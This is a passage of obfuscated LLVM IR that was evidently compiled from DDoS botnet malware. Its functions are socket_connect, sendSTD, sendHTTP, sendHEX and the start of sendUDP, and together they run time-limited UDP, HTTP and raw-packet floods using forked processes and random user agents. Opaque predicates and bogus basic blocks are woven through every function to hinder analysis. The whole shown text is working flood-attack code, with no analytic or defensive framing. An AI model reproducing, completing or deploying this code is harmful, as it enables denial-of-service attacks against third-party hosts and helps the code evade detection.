  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.53
  %19 = load i32, i32* @y.54
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %7
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @close(i32 %28)
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.55
  %15 = load i32, i32* @y.56
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.55
  %23 = load i32, i32* @y.56
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %61

; <label>:30:                                     ; preds = %2
  %31 = load %struct.hostent*, %struct.hostent** %6, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 4
  %33 = load i8**, i8*** %32, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %37 = bitcast %struct.in_addr* %36 to i8*
  %38 = load %struct.hostent*, %struct.hostent** %6, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 3
  %40 = load i32, i32* %39, align 4
  %41 = sext i32 %40 to i64
  call void @bcopy(i8* %35, i8* %37, i64 %41) #2
  %42 = load i16, i16* %5, align 2
  %43 = call zeroext i16 @htons(i16 zeroext %42) #13
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %43, i16* %44, align 2
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %45, align 4
  %46 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %46, i32* %9, align 4
  %47 = load i32, i32* %9, align 4
  %48 = bitcast i32* %8 to i8*
  %49 = call i32 @setsockopt(i32 %47, i32 6, i32 1, i8* %48, i32 4) #2
  %50 = load i32, i32* %9, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %30
  store i32 0, i32* %3, align 4
  br label %61

; <label>:53:                                     ; preds = %30
  %54 = load i32, i32* %9, align 4
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 16)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %53
  store i32 0, i32* %3, align 4
  br label %61

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %9, align 4
  store i32 %60, i32* %3, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %52, %originalBBpart2
  %62 = load i32, i32* %3, align 4
  ret i32 %62

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %98, %3
  %40 = load i32, i32* @x.57
  %41 = load i32, i32* @y.58
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %48, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %49 = call i32 @rand() #2
  %50 = sext i32 %49 to i64
  %51 = urem i64 %50, 36
  %52 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  store i8* %53, i8** %13, align 8
  %54 = load i32, i32* %11, align 4
  %55 = icmp uge i32 %54, 50
  %56 = load i32, i32* @x.57
  %57 = load i32, i32* @y.58
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %55, label %64, label %98

; <label>:64:                                     ; preds = %originalBBpart2
  %65 = load i32, i32* %7, align 4
  %66 = load i8*, i8** %13, align 8
  %67 = call i64 @send(i32 %65, i8* %66, i64 50, i32 0)
  %68 = load i32, i32* %7, align 4
  %69 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %70 = call i32 @connect(i32 %68, %struct.sockaddr* %69, i32 16)
  %71 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %72 = sext i32 %71 to i64
  %73 = load i64, i64* %8, align 8
  %74 = load i32, i32* %6, align 4
  %75 = sext i32 %74 to i64
  %76 = add nsw i64 %73, %75
  %77 = icmp sge i64 %72, %76
  br i1 %77, label %78, label %97

; <label>:78:                                     ; preds = %64
  %79 = load i32, i32* @x.57
  %80 = load i32, i32* @y.58
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i32, i32* %7, align 4
  %88 = call i32 @close(i32 %87)
  call void @_exit(i32 0) #12
  %89 = load i32, i32* @x.57
  %90 = load i32, i32* @y.58
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:97:                                     ; preds = %64
  store i32 0, i32* %11, align 4
  br label %98

; <label>:98:                                     ; preds = %97, %originalBBpart2
  %99 = load i32, i32* %11, align 4
  %100 = add i32 %99, 1
  store i32 %100, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %39
  %102 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %102, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %103 = call i32 @rand() #2
  %104 = sext i32 %103 to i64
  %_ = sub i64 %104, 36
  %gen = mul i64 %_, 36
  %105 = urem i64 %104, 36
  %106 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %105
  %107 = load i8*, i8** %106, align 8
  store i8* %107, i8** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = icmp uge i32 %108, 50
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %110 = load i32, i32* %7, align 4
  %111 = call i32 @close(i32 %110)
  call void @_exit(i32 0) #12
  br label %originalBB1
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %17, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i32 @getdtablesize() #2
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %originalBBpart28, %3
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %167

; <label>:25:                                     ; preds = %21
  %26 = call i32 @fork() #2
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %147

; <label>:28:                                     ; preds = %25
  br label %29

; <label>:29:                                     ; preds = %146, %28
  %30 = load i32, i32* @x.59
  %31 = load i32, i32* @y.60
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i8*, i8** %4, align 8
  %39 = load i32, i32* %5, align 4
  %40 = trunc i32 %39 to i16
  %41 = call i32 @socket_connect(i8* %38, i16 zeroext %40)
  store i32 %41, i32* %8, align 4
  %42 = load i32, i32* %8, align 4
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.59
  %45 = load i32, i32* @y.60
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %121

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %54 = call i8* @strcpy(i8* %53, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0)) #2
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #10
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = call i32 @rand() #2
  %60 = sext i32 %59 to i64
  %61 = urem i64 %60, 3
  %62 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %61
  %63 = load i8*, i8** %62, align 8
  %64 = call i8* @strcpy(i8* %58, i8* %63) #2
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i8* @strcpy(i8* %68, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.81, i32 0, i32 0)) #2
  %70 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %72 = call i64 @strlen(i8* %71) #10
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = load i8*, i8** %4, align 8
  %75 = call i8* @strcpy(i8* %73, i8* %74) #2
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %77 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %78 = call i64 @strlen(i8* %77) #10
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = call i8* @strcpy(i8* %79, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.82, i32 0, i32 0)) #2
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %82 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %83 = call i64 @strlen(i8* %82) #10
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = call i32 @rand() #2
  %86 = sext i32 %85 to i64
  %87 = urem i64 %86, 32
  %88 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %87
  %89 = load i8*, i8** %88, align 8
  %90 = call i8* @strcpy(i8* %84, i8* %89) #2
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %93 = call i64 @strlen(i8* %92) #10
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = call i8* @strcpy(i8* %94, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.83, i32 0, i32 0)) #2
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %98 = call i64 @strlen(i8* %97) #10
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = call i32 @rand() #2
  %101 = sext i32 %100 to i64
  %102 = urem i64 %101, 3
  %103 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = call i8* @strcpy(i8* %99, i8* %104) #2
  %106 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %107 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %108 = call i64 @strlen(i8* %107) #10
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = call i8* @strcpy(i8* %109, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.84, i32 0, i32 0)) #2
  %111 = load i32, i32* %8, align 4
  %112 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %113 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %114 = call i64 @strlen(i8* %113) #10
  %115 = call i64 @write(i32 %111, i8* %112, i64 %114)
  %116 = load i32, i32* %8, align 4
  %117 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i32 0, i32 0
  %118 = call i64 @read(i32 %116, i8* %117, i64 1)
  %119 = load i32, i32* %8, align 4
  %120 = call i32 @close(i32 %119)
  br label %121

; <label>:121:                                    ; preds = %52, %originalBBpart2
  %122 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %123 = sext i32 %122 to i64
  %124 = load i64, i64* %9, align 8
  %125 = load i32, i32* %6, align 4
  %126 = sext i32 %125 to i64
  %127 = add nsw i64 %124, %126
  %128 = icmp sge i64 %123, %127
  br i1 %128, label %129, label %146

; <label>:129:                                    ; preds = %121
  %130 = load i32, i32* @x.59
  %131 = load i32, i32* @y.60
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %129
  call void @_exit(i32 0) #12
  %138 = load i32, i32* @x.59
  %139 = load i32, i32* @y.60
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:146:                                    ; preds = %121
  br label %29

; <label>:147:                                    ; preds = %25
  br label %148

; <label>:148:                                    ; preds = %147
  %149 = load i32, i32* @x.59
  %150 = load i32, i32* @y.60
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %148
  %157 = load i32, i32* %7, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %7, align 4
  %159 = load i32, i32* @x.59
  %160 = load i32, i32* @y.60
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %21

; <label>:167:                                    ; preds = %21
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %29
  %168 = load i8*, i8** %4, align 8
  %169 = load i32, i32* %5, align 4
  %170 = trunc i32 %169 to i16
  %171 = call i32 @socket_connect(i8* %168, i16 zeroext %170)
  store i32 %171, i32* %8, align 4
  %172 = load i32, i32* %8, align 4
  %173 = icmp ne i32 %172, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %129
  call void @_exit(i32 0) #12
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %148
  %174 = load i32, i32* %7, align 4
  %_ = sub i32 0, %174
  %gen = add i32 %_, 1
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %7, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %21 = load i32, i32* %11, align 4
  %22 = add nsw i32 %20, %21
  store i32 %22, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.85, i32 0, i32 0))
  store i32 0, i32* %14, align 4
  br label %25

; <label>:25:                                     ; preds = %67, %6
  %26 = load i32, i32* %14, align 4
  %27 = load i32, i32* %12, align 4
  %28 = icmp slt i32 %26, %27
  br i1 %28, label %29, label %70

; <label>:29:                                     ; preds = %25
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #2
  %35 = srem i32 %34, 36
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.86, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38)
  %40 = call i32 @fork() #2
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %66

; <label>:42:                                     ; preds = %29
  br label %43

; <label>:43:                                     ; preds = %64, %42
  %44 = load i32, i32* %15, align 4
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = icmp sgt i32 %44, %45
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %64

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #10
  %58 = call i64 @write(i32 %54, i8* %55, i64 %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %61 = call i64 @read(i32 %59, i8* %60, i64 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 %62)
  br label %64

; <label>:64:                                     ; preds = %53, %47
  br label %43

; <label>:65:                                     ; preds = %43
  call void @exit(i32 0) #14
  unreachable

; <label>:66:                                     ; preds = %29
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %14, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %14, align 4
  br label %25

; <label>:70:                                     ; preds = %25
  %71 = load i32, i32* @x.61
  %72 = load i32, i32* @y.62
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %70
  %79 = load i32, i32* @x.61
  %80 = load i32, i32* @y.62
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %70
  br label %originalBB
}

declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = load i32, i32* @x.63
  %10 = load i32, i32* @y.64
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  store i8* %0, i8** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 %7, i32* %24, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %18, align 4
  %44 = icmp eq i32 %43, 0
  %45 = load i32, i32* @x.63
  %46 = load i32, i32* @y.64
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %44, label %53, label %73

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = load i32, i32* @x.63
  %55 = load i32, i32* @y.64
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = call i32 @rand_cmwc()
  %63 = trunc i32 %62 to i16
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %63, i16* %64, align 2
  %65 = load i32, i32* @x.63
  %66 = load i32, i32* @y.64
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
